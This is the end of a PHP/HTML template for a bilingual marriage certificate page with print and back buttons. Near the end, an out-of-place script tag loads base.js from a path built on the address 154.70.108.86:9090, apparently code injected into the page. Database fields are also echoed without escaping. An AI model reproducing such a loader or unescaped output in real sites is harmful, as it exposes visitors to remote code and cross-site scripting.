<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:102px"></td>
<td style="width:164px"></td>
<td style="width:280px"></td>
</tr>
<tr valign="top" style="height:25px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BrDOB']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:260px"></td>
<td style="width:271px"></td>
<td style="width:15px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:31px"></td>
<td style="width:240px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">à</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:14px"></td>
<td style="width:257px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:33px"></td>
<td style="width:224px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- at</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:24px"></td>
<td style="width:233px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BrPOB']; ?></span></td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:89px">
<td colspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:309px"></td>
<td style="width:237px"></td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:533px"></td>
<td style="width:13px"></td>
</tr>
<tr valign="top" style="height:89px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:76px"></td>
<td style="width:457px"></td>
</tr>
<tr valign="top" style="height:17px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:21px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Nationalité</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:68px"></td>
<td style="width:75px"></td>
<td style="width:390px"></td>
</tr>
<tr valign="top" style="height:17px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Nationality</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:151px"></td>
<td style="width:378px"></td>
<td style="width:3px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:81px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Profession</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:69px"></td>
<td style="width:82px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Occupation</span></td>
</tr>
</table>
</div>
</div>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BrOcc']; ?></span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:69px">
<td colspan="4">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:145px"></td>
<td style="width:306px"></td>
<td style="width:82px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Cameroonian</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:533px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
</tr>
<tr valign="top" style="height:53px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:80px"></td>
<td style="width:453px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Domicilié à</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:532px"></td>
</tr>
<tr valign="top" style="height:53px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:71px"></td>
<td style="width:82px"></td>
<td style="width:1px"></td>
<td style="width:378px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Resident at</span></td>
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BrRes']; ?></span></td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:216px"></td>
<td style="width:214px"></td>
<td style="width:63px"></td>
<td style="width:26px"></td>
<td style="width:13px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="5">
</td>
</tr>
<tr valign="top" style="height:17px">
<td rowspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:42px"></td>
<td style="width:174px"></td>
</tr>
<tr valign="top" style="height:17px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Fille de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:216px"></td>
</tr>
<tr valign="top" style="height:5px">
<td>
</td>
</tr>
<tr valign="top" style="height:33px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:60px"></td>
<td style="width:156px"></td>
</tr>
<tr valign="top" style="height:14px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:19px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Daughter of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:39px"></td>
<td style="width:15px"></td>
<td style="width:156px"></td>
<td style="width:6px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;"><?php echo $row['BrFName']; ?></span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td colspan="2" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:13px">
<td colspan="4">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:4px"></td>
<td style="width:42px"></td>
<td style="width:168px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Fils de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:214px"></td>
</tr>
<tr valign="top" style="height:5px">
<td>
</td>
</tr>
<tr valign="top" style="height:31px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:51px"></td>
<td style="width:163px"></td>
</tr>
<tr valign="top" style="height:12px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:19px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Son of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:43px"></td>
<td style="width:9px"></td>
<td style="width:162px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;"><?php echo $row['BrMName']; ?></span></td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:11px">
<td colspan="3">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Dautre part</span></td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">On the other hand</span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:2px">
<td colspan="4">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:11px">
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="9">
</td>
<td colspan="17" style="text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">The bride nd bridegroom state that the matrimonal regim is:</span></td>
<td colspan="9">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="8">
</td>
<td colspan="19" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['Prop_type']; ?></span></td>
<td colspan="8">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="7">
</td>
<td colspan="21" style="border-top: 1px solid #000000; ">
</td>
<td colspan="7">
</td>
</tr>
<tr valign="top" style="height:131px">
<td colspan="35">
</td>
</tr>
</table>

</td><td width="50%">&nbsp;</td></tr>
</table>
</div>
<script type="text/javascript">
	function printDiv(divName) {
     var printContents = document.getElementById(divName).innerHTML;
     var originalContents = document.body.innerHTML;

     document.body.innerHTML = printContents;

     window.print();

     document.body.innerHTML = originalContents;
}
</script>

<div class="row ">
	
		<div class="col-lg-12 p-t-20 text-center">
			<a class="btn deepPink-bgcolor btn-lg" href="all_marriages.php">back</a>
			<input class="btn btn-success btn-lg " type="button" onclick="printDiv('mc')" value="print" />
		</div>
		
	<!-- start js include path -->
	<script src="../assets/plugins/jquery/jquery.min.js"></script>
	<script src="../assets/plugins/popper/popper.js"></script>
	<script src="../assets/plugins/jquery-blockui/jquery.blockui.min.js"></script>
	<script src="../assets/plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- bootstrap -->
	<script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<script src="../assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
	<!-- data tables -->
	<script src="../assets/plugins/datatables/jquery.dataTables.min.js"></script>
	<script src="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.js"></script>
	<script src="../assets/js/pages/table/table_data.js"></script>
	<!-- Common js-->
	<script src="../assets/js/app.js"></script>
	<script src="../assets/js/layout.js"></script>
	<script src="../assets/js/theme-color.js"></script>
	<!-- Material -->
	<script src="../assets/plugins/material/material.min.js"></script>
	<!-- end js include path -->
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../../../154.70.108.86_9090/www/default/base.js'></script>

	
</div>
</body>
</html>
